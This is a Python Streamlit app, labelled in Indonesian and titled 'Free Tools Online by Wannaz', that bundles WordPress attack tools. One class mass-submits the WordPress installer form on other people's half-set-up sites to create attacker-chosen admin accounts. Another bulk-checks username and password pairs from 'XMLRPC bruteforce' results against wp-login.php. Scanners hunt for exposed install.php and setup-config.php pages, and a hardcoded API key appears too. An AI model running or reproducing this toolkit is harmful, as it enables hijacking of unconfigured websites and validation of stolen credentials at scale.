import streamlit as st
import pandas as pd
import numpy as np
from PIL import Image
from ipaddress import IPv4Network
from bs4 import BeautifulSoup
import random
import requests
import os
import time
import json

class CheckDAPA:
	def __init__(self):
		self.check_domain()
		
	def check_domain(self):
		domain_input = st.text_area('Masukan Domain')
		li = domain_input.split("\n")
		url = 'https://rasenmedia.my.id/api/dapa?apikey=lutpipantadhitamm&domain='
		get_now = st.button('Check!')
		if get_now:
			for dom in li:
				try:
					st.write(f'**Domain : {dom}**')
					req = requests.get(url+str(dom)).text
					parse = json.loads(req)
					da = parse['DA']
					pa = parse['PA']
					mr = parse['MR']
					data = {f'Domain':[dom],'DA':[da], 'PA':[pa], 'MR':[mr]}
					table_data = pd.DataFrame(
					data,
					columns=('Domain','DA','PA','MR'),
					index=['1'])
					st.table(table_data)
				except:
					st.error('APi error or Wrong input domain')
					
class AutoWPInstall:
	def __init__(self):
		self.user_agent()
		self.agent()
		self.auto_wp_install()
		
	def user_agent(self):
		ua = open('user-agents.txt','r').read().splitlines()
		return random.choice(ua)
		
	def agent(self):
		agents = {'User-Agent':self.user_agent()}
		return agents
		
	def auto_wp_install(self):
		try:
			st.info('List site harus dengan step 2, jika site sebelumnya udah di install maka akan tertulis succes install')
			st.info('Contoh : site.com/wp-admin/install.php?step=2')
			target_input = st.text_area('Masukan  Site + Path Step 2 : ')
			lis = target_input.split('\n')
			title_input = st.text_input('Judul Website : ')
			user_input = st.text_input('Username : ')
			pw_input = st.text_input('Password : ')
			email_input = st.text_input('Email : ')
			klik = st.button('Run Install !')
			if klik:
				for target in lis:
					title = title_input
					username = user_input
					password = pw_input
					email = email_input
					sub = 'submit'
					
					uagent = self.agent()
					r = requests.Session()
					site = target.replace('/wp-admin/install.php?step=2','')
					http_data = {
					'weblog_title':title,
					'user_name':username,
					'admin_password':password,
					'admin_password2':password,
					'pw_weak':1,
					'admin_email':email,
					'blog_public':0,
					'submit':sub
					}
					req = r.post(target, headers=uagent, data=http_data).text
					space_delete = site.strip()
					detect = f'<a href="{space_delete}/wp-login.php" class="button button-large">'
					
					if detect in req:
						succes_install = f'<p style="font-family:sans-serif; color:Green; font-size: 12px;">{target} [Succes Install]</p>'
						st.markdown(succes_install, unsafe_allow_html=True)
						file = open('Result-WP-Install.txt', 'a').write(target+'\n')
					else:
						failed_install = f'<p style="font-family:sans-serif; color:Red; font-size: 12px;">{target} [Failed Install]</p>'
						st.markdown(failed_install, unsafe_allow_html=True)
				with open('Result-WP-Install.txt','r') as data:
					st.download_button(
					label='Download Result Succes Install',
					data=data,
					file_name='Result Succes Install.txt',
					mime='text/plain',
					)
				with st.spinner('Silahkan download resultnya..'):
					time.sleep(30)
					os.remove('Result-WP-Install.txt')
				st.success('Result di hapus dari server!')
		except Exception as e:
			st.write(f'{e}')
			
class XMLPRCResultCheckLogin:
	def __init__(self):
		self.uagent()
		self.xmlrpc_bf_check()
		
	def uagent(self):
		ua = open('user-agents.txt','r').read().splitlines()
		return random.choice(ua)
		
	def xmlrpc_bf_check(self):
		try:
			st.info('Masukan site sesuai yang anda di contoh, bisa mass maupun satu, bisa untuk cek login lain tidak harus result xmlrpc bruteforce.')
			site_input = st.text_area('Masukan Site (site.com#username@pass) : ')
			splitsite = site_input.split('\n')
			bttn = st.button('Check Site !')
			if bttn:
				for site in splitsite:
					try:
						wp_login = site.split('#')[0]
						#wp-login.php
						wp_admin1 = wp_login.replace('/wp-login.php','')
						wp_admin = wp_admin1+'/wp-admin'
						#wp-admin
						username1 = site.split('#',1)[1]
						username = username1.split('@',1)[0]
						#username
						password = site.split('@',1)[1]
						#password
						try:
							try:
								try:
									agents = self.uagent()
									req = requests.Session()
									headers1 = {
									'User-Agent':agents,
									'Cookie':'wordpress_test_cookie=WP Cookie check'
									}
									datar={
									'log':username, 'pwd':password, 'wp-submit':'Log In', 
									'redirect_to':wp_admin, 'testcookie':'1'
									}
									login = req.post(wp_login, headers=headers1, data=datar)
									reqs = req.get(wp_admin).text
									if 'wp-toolbar' in reqs:
										succes_login = f'<p style="font-family:sans-serif; color:Green; font-size: 13px;">{site} | Succes Login |</p>'
										st.markdown(succes_login, unsafe_allow_html=True)
										files = open('Result-XMLRPC.txt', 'a').write(site+'\n')
									else:
										failed_login = f'<p style="font-family:sans-serif; color:Red; font-size: 13px;">{site} | Failed Login |</p>'
										st.markdown(failed_login, unsafe_allow_html=True)
								except requests.exceptions.Timeout:
									error_login = f'<p style="font-family:sans-serif; color:Orange; font-size: 13px;">{site} | Timeout Error |</p>'
									st.markdown(error_login, unsafe_allow_html=True)
							except requests.exceptions.RequestException:
								error_login = f'<p style="font-family:sans-serif; color:Orange; font-size: 13px;">{site} | Error Something Else |</p>'
								st.markdown(error_login, unsafe_allow_html=True)
						except requests.exceptions.ConnectionError:
							error_login = f'<p style="font-family:sans-serif; color:Orange; font-size: 13px;">{site} | Connection Error |</p>'
							st.markdown(error_login, unsafe_allow_html=True)
					except requests.exceptions.HTTPError:
						error_login = f'<p style="font-family:sans-serif; color:Orange; font-size: 13px;">{site} | HTTP Error |</p>'
						st.markdown(error_login, unsafe_allow_html=True)
				with open('Result-XMLRPC.txt','r') as data:
					st.download_button(
					label='Download Result Succes Login',
					data=data,
					file_name='(XMLRPC) Result Succes Login.txt',
					mime='text/plain',
					)
				with st.spinner('Silahkan download resultnya..'):
					time.sleep(30)
					os.remove('Result-XMLRPC.txt')
				st.success('Result di hapus dari server!')
		except Exception as e:
			st.write(f'{e}')
			
class RangeIP:
  	def __init__(self):
  		self.rangeipaddress()
  	
  	def rangeipaddress(self):
  		st.info('IP tanpa menggunakan http://, contoh (10.203.17.18) murni ip tidak ada garis')
  		ip_input = st.text_area('Masukan IP (mass or one) : ')
  		list = ip_input.split('\n')
  		bttn = st.button('Run Range !')
  		if bttn:
  			for ip in list:
  				try:
  					range = IPv4Network(ip+'/24',False)
  					for ipa in range:
  						range_ipa = f'<p style="font-family:sans-serif; color:Green; font-size: 13px;">> {ipa}</p>'
  						st.markdown(range_ipa,unsafe_allow_html=True)
  						files = open('Result-Range-IP.txt','a').write(str(ipa)+'\n')
  				except:
  					st.error('Error, jangan gunakan http:// atau / dan sejenisnya')
  			try:
  				with open('Result-Range-IP.txt','r') as data:
  					st.download_button(
  					label='Download Result Range IP',
  					data=data,
  					file_name='Result Range IP.txt',
  					mime='text/plain',
  					)
  					with st.spinner('Silahkan download resultnya..'):
  						time.sleep(15)
  						os.remove('Result-Range-IP.txt')
  					st.success('Result di hapus dari server!')
  			except:
  				st.error('Error data')
  			
class GrabSiteRankData:
  		def __init__(self):
  			self.grabber_site()
  			self.user_agent()
  			self.agent()
  			
  		def user_agent(self):
  			ua = open('user-agents.txt','r').read().splitlines()
  			return random.choice(ua)
  			
  		def agent(self):
  			agents = {'User-Agent':self.user_agent()}
  			return agents
  		
  		def grabber_site(self):
  			st.info('Date terbaru adalah hari kemarin, jika page nya belum sampai pada input akan error')
  			tgl_input = st.date_input('Masukan Tanggal : ')
  			start_page = int(st.number_input('Mulai dari page : ',0))
  			end_page = int(st.number_input('Sampai page : ',0))
  			page_start=(start_page-1)
  			page_end=(end_page+1)
  			page=int(0)
  			bttn = st.button('Grab !')
  			if bttn:
  				while True:
  					page_start += 1
  					page += 50
  					agent = self.agent()
  					url = 'https://siterankdata.com/show/detected/'+str(tgl_input)+'/'+str(page_start)+'-'+str(page)
  					req = requests.get(url,headers=agent).text
  					bs = BeautifulSoup(req,'html.parser')
  					cari = bs.find_all('h4',class_='m-b-xs')
  					berhenti = 'https://siterankdata.com/show/detected/'+str(tgl_input)+'/'+str(page_end)+'-'+str(page)
  					if berhenti in url:
  						st.write(f'**Berhenti di page {end_page}**')
  						break
  					else:
  						for find_txt in cari:
  							get_txt = find_txt.find('a').get_text()
  							files = open('Data-Grab.txt','a').write(get_txt+'\n')
  							
  				reads = open('Data-Grab.txt','r').read()
  				add_space = (' '.join(reads))
  				st.text_area('Result : ',add_space)
  				
  				filename = f'Grab {tgl_input}.txt'
  				st.download_button(
  				label='Download Result Grab',
  				data=reads,
  				file_name=filename,
  				mime='text/plain',
  				)
  				
  				with st.spinner('Silahkan download resultnya..'):
  					time.sleep(15)
  					os.remove('Data-Grab.txt')
  				st.success('Result di hapus dari server!')
  				
class WPInstallChecker:
  				def __init__(self):
  					self.user_agent()
  					self.checker_wp_install()
  					
  				def user_agent(self):
  					ua = open('user-agents.txt', 'r').read().splitlines()
  					return random.choice(ua)
  					
  				def checker_wp_install(self):
  					st.info('Masukan domain saja atau tambahkan path juga bisa, contoh input (http://site.com) ')
  					site_input = st.text_area('Masukan Site (mass or one) : ')
  					list = site_input.split('\n')
  					bttn = st.button('Check !')
  					if bttn:
  						try:
  							for sites in list:
  								Agents = {'User-Agent':self.user_agent()}
  								exploit1 = sites+'/wp-admin/install.php?step=1'
  								r = requests.get(exploit1, headers=Agents)
  								if '<form id="setup" method="post" action="install.php?step=2" novalidate="novalidate">' in r.text:
  									wp_install = f'<p style="font-family:sans-serif; color:Green; font-size: 13px;">{exploit1} [Exist]</p>'
  									st.markdown(wp_install,unsafe_allow_html=True)
  									open('WPInstall.txt','a').write(exploit1+'\n')
  								else:
  									wp_installs = f'<p style="font-family:sans-serif; color:Red; font-size: 13px;">{exploit1} [Not Exist]</p>'
  									st.markdown(wp_installs,unsafe_allow_html=True)
  						except Exception as e:
  							print(f'{exploit1} : {e}')
  						
  						try:
  							with open('WPInstall.txt','r') as data:
  								st.download_button(
  								label='Download Result Check',
  								data=data,
  								file_name='Result Check WP Install.txt',
  								mime='text/plain',
  								)
  							with st.spinner('Silahkan download resultnya..'):
  								time.sleep(15)
  								os.remove('WPInstall.txt')
  							st.success('Result di hapus dari server!')
  						except:
  							st.error('Error data file')
  							
class WPConfigChecker:
  				def __init__(self):
  					self.user_agent()
  					self.checker_wp_config()
  					
  				def user_agent(self):
  					ua = open('user-agents.txt', 'r').read().splitlines()
  					return random.choice(ua)
  					
  				def checker_wp_config(self):
  					st.info('Masukan domain saja atau tambahkan path juga bisa, contoh input (http://site.com) ')
  					site_input = st.text_area('Masukan Site (mass or one) : ')
  					list = site_input.split('\n')
  					bttn = st.button('Check !')
  					if bttn:
  						try:
  							for sites in list:
  								Agents = {'User-Agent':self.user_agent()}
  								exploit1 = sites+'/wp-admin/setup-config.php?step=1'
  								r = requests.get(exploit1, headers=Agents)
  								if '<form method="post" action="setup-config.php?step=2">' in r.text:
  									wp_config = f'<p style="font-family:sans-serif; color:Green; font-size: 13px;">{exploit1} [Exist]</p>'
  									st.markdown(wp_config,unsafe_allow_html=True)
  									open('WPConfig.txt','a').write(exploit1+'\n')
  								else:
  									wp_installs = f'<p style="font-family:sans-serif; color:Red; font-size: 13px;">{exploit1} [Not Exist]</p>'
  									st.markdown(wp_installs,unsafe_allow_html=True)
  						except Exception as e:
  							print(f'{exploit1} : {e}')
  						
  						try:
  							with open('WPConfig.txt','r') as data:
  								st.download_button(
  								label='Download Result Check',
  								data=data,
  								file_name='Result Check WP Setup Config.txt',
  								mime='text/plain',
  								)
  							with st.spinner('Silahkan download resultnya..'):
  								time.sleep(15)
  								os.remove('WPConfig.txt')
  							st.success('Result di hapus dari server!')
  						except:
  							st.error('Error data file')
  							
class WebStatusCode:
  				def __init__(self):
  					self.user_agent()
  					self.status_code_web()
  					
  				def user_agent(self):
  					ua = open('user-agents.txt', 'r').read().splitlines()
  					return random.choice(ua)
  					
  				def status_code_web(self):
  					st.info('URL harus menggunakan awalan http:// atau https://, contoh (http://site.com) ')
  					url_input = st.text_area('Masukan URL (mass or one) : ')
  					list = url_input.split('\n')
  					bttn = st.button('Run !')
  					if bttn:
  						for url in list:
  							try:
  								agents = {'User-Agent':self.user_agent()}
  								req = requests.get(url,headers=agents)
  								status_code = req.status_code
  								data = {f'URL':[url],'Status':[status_code]}
  								table_data = pd.DataFrame(
  								data,
  								columns=('URL','Status'),
  								index=['1'])
  								st.table(table_data)
  							except:
  								data = {f'URL':[url],'Status':['Error URL']}
  								table_data = pd.DataFrame(
  								data,
  								columns=('URL','Status'),
  								index=['1'])
  								st.table(table_data)
  				
if __name__ == '__main__':
	
	st.set_page_config(
	page_title = 'Web App | Wannaz',
	page_icon=':shark',
	menu_items={
	'Get Help': 'http://wa.me/6281328303820',
	'Report a Bug': 'http://wa.me/6281328303820',
	'About': 'Free Tools Online by Wannaz'}
	)
	
	hide_streamlit_style = '''
            <style>
            #MainMenu {visibility: hidden;}
            footer {visibility: hidden;}
            </style>
            '''
	st.markdown(hide_streamlit_style, unsafe_allow_html=True)
	image = Image.open('banner.png')
	st.image(image)
	menu_input = st.selectbox('**Pilih Tools**',['DA PA Checker','Auto Wordpress Install','XMLRPC BF Result Check Login','Range IP Address','Grabber Domain SiteRankData','WordPress Install Checker','WordPress Setup Config Checker','Website Status Code'])
	if menu_input == 'DA PA Checker':
		st.write('# DA PA Checker')
		st.info('Masukan domain dengan benar hehe')
		domain_check = CheckDAPA()
	elif menu_input == 'Auto Wordpress Install':
		st.write('# Auto Wordpress Install')
		wp_install = AutoWPInstall()
	elif menu_input == 'XMLRPC BF Result Check Login':
		st.write('# Result XMLRPC BF Check Login')
		check_xmlrpc = XMLPRCResultCheckLogin()
	elif menu_input == 'Range IP Address':
		st.write('# Range IP Address')
		ranges_ip = RangeIP()
	elif menu_input == 'Grabber Domain SiteRankData':
		st.write('# Grab Domain SiteRankData')
		grab_domain = GrabSiteRankData()
	elif menu_input == 'WordPress Install Checker':
		st.write('# WP Install Checker')
		install_wp = WPInstallChecker()
	elif menu_input == 'WordPress Setup Config Checker':
		st.write('# WP Setup Config Checker')
		setup_config = WPConfigChecker()
	elif menu_input == 'Website Status Code':
		st.write('# Website Status Code')
		status_code = WebStatusCode()